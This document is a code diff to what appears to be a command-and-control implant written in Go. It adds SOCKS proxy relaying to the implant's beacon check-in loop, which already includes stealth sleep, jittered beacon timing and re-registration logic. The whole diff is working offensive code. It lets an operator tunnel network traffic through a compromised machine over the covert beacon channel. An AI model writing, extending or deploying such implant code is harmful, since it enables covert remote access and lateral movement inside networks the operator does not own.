@@ -660,12 +660,35 @@ func main() {
 		consecutiveFailures := 0
 		const maxFailures = 50
 		const reRegisterAfter = 5
+
+		// SOCKS relay support over beacon transport
+		var socksMgr *SocksManager
+		var socksOutMu sync.Mutex
+		var socksOutbox []map[string]interface{}
+		socksSendFn := func(msg map[string]interface{}) error {
+			socksOutMu.Lock()
+			socksOutbox = append(socksOutbox, msg)
+			socksOutMu.Unlock()
+			return nil
+		}
+
 		for {
 			select {
 			case <-svc.ctx.Done():
+				if socksMgr != nil {
+					socksMgr.CloseAll()
+				}
 				return
 			default:
 			}
+
+			// Append buffered socks data to pending results
+			socksOutMu.Lock()
+			for _, msg := range socksOutbox {
+				pending = append(pending, msg)
+			}
+			socksOutbox = socksOutbox[:0]
+			socksOutMu.Unlock()
 
 			commands, err := transport.Checkin(agentID, pending)
 			if err != nil {
@@ -689,8 +712,28 @@ func main() {
 			pending = nil
 			consecutiveFailures = 0
 
-			pending = svc.processTasks(commands)
+			// Split commands into regular tasks and socks messages
+			var regularTasks []map[string]interface{}
+			for _, cmd := range commands {
+				cmdType, _ := cmd["type"].(string)
+				command, _ := cmd["command"].(string)
+				if cmdType == "socks_init" || cmdType == "socks_connect" || cmdType == "socks_send" || cmdType == "socks_data" {
+					socksMgr = HandleSocksMessage(cmd, socksMgr, socksSendFn)
+				} else if command == "__socks_stop" {
+					if socksMgr != nil {
+						socksMgr.CloseAll()
+						socksMgr = nil
+					}
+				} else {
+					regularTasks = append(regularTasks, cmd)
+				}
+			}
+
+			pending = svc.processTasks(regularTasks)
 			if svc.ctx.Err() != nil {
+				if socksMgr != nil {
+					socksMgr.CloseAll()
+				}
 				return
 			}
 			stealthSleep(randomizeBeaconTiming(svc.parseInterval(), svc.parseJitter()))
